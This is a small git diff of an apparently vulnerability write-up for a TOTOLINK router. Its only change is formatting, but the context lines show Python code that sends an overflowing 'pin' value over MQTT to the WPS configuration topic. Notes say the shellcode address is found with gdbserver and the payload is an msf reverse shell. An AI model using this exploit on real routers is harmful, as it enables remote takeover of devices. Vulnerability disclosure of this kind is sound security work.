@@ -60,7 +60,7 @@ client = mqtt.Client()
 client.connect("192.168.55.1",1883,60)
 client.publish('totolink/router/setting/setWiFiWpsConfig',payload='{"topicurl":"setting/setWiFiWpsConfig","wifiIdx":"0","wscMode":"1","wscPinMode":"1","pin":"'+pay+'"}'+'bbbbb'+buf)
 ```
-**PS:**
+**PS:** <br>
 The offset maybe different in each device. <br>
 **\x44\x03\x42** is the address which shellcode in,to get the address,you need to use gdbserver. <br>
 The shellcode is which made by msf to reverse the shell <br>
